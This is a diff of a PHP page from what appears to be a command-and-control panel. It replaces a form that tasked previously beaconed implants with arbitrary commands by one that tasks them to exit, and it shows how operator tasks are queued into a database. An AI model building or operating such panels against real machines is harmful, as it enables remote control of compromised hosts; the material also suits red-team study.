@@ -73,7 +73,7 @@
           $hosts = $statement->fetchAll();
 
           # Kills database connection
-          $statement->connection = null; 
+          $statement->connection = null;
             
           # Populates each <option> with our hosts that have beaconed previously
           foreach($hosts as $row)
@@ -82,38 +82,36 @@
           }
         ?>
         </select>
-        <input type="text" style="width: 400px;" class="form-control" name="command" placeholder="Command">
-        <button type="submit" name="submit" class="btn btn-default">Task Command</button>
+        <button type="submit" name="submit" class="btn btn-default">Task Implant Exit</button>
       </form> <!-- End of task command form -->
 
       <?php
-        # If the user clicked "Task Command"
+        # If the user clicked "Task Implant Exit"
         if (isset($_POST["submit"]))
         {
           # If all fields are set
           # Prevent null entries from being added to the "tasks" table
-          if (isset($_POST["hostname"]) && !empty($_POST["hostname"]) && isset($_POST["command"]) && !empty($_POST["command"]))
+          if (isset($_POST["hostname"]) && !empty($_POST["hostname"]))
           {
-            $command = $_POST["command"];   # Command that was entered
             $username = $_SESSION["username"]; # Current logged in user
 
             # For loop to loop through each hostname that was selected for a task
             for ($counter = 0; $counter < sizeof($_POST["hostname"]); $counter++)
             {
               # Inserts user, action, hostname, and secondary into "tasks" table
-              $statement = $dbConnection->prepare("INSERT INTO tasks (user, action, hostname, secondary) VALUES (:user, :action, :hostname, :secondary)");
+              $statement = $dbConnection->prepare("INSERT INTO tasks (user, action, secondary, hostname) VALUES (:user, :action, :secondary, :hostname)");
               $statement->bindValue(":user", $username);
-              $statement->bindValue(":action", "command");
+              $statement->bindValue(":action", "exit");
+              $statement->bindValue(":secondary", "none");
               $statement->bindValue(":hostname", $_POST["hostname"][$counter]);
-              $statement->bindValue(":secondary", $command);  
               $statement->execute();
 
               # Inserts username, hostname, action, secondary, and status into "output" table
               $statement = $dbConnection->prepare("INSERT INTO output (user, hostname, action, secondary, status) VALUES (:user, :hostname, :action, :secondary, :status)");
               $statement->bindValue(":user", $username);
               $statement->bindValue(":hostname", $_POST["hostname"][$counter]);
-              $statement->bindValue(":action", "command");
-              $statement->bindValue(":secondary", $command);
+              $statement->bindValue(":action", "exit");
+              $statement->bindvalue(":secondary", "none");
               $statement->bindValue(":status", "N");
               $statement->execute();
             }
@@ -121,12 +119,12 @@
             # Kills database connection
             $statement->connection = null;
 
-            # Displays success message - "Successfully tasked command. Redirecting back to command.php in 1 seconds. Do not refresh the page."
-            echo "<br><div class='alert alert-success'>Successfully tasked command. Redirecting back to command.php in 1 seconds. Do not refresh the page.</div>";
+            # Displays success message - "Successfully tasked command. Redirecting back to exit.php in 1 second. Do not refresh the page."
+            echo "<br><div class='alert alert-success'>Successfully tasked implant exit. Redirecting back to exit.php in 1 second. Do not refresh the page.</div>";
 
             # Waits 3 seconds, then redirects to commandSubmit.php
             # This is a hack to clear out the POST data
-            header('Refresh: 1; URL=commandSubmit.php');
+            header('Refresh: 1; URL=exitSubmit.php');
           }
           else
           {
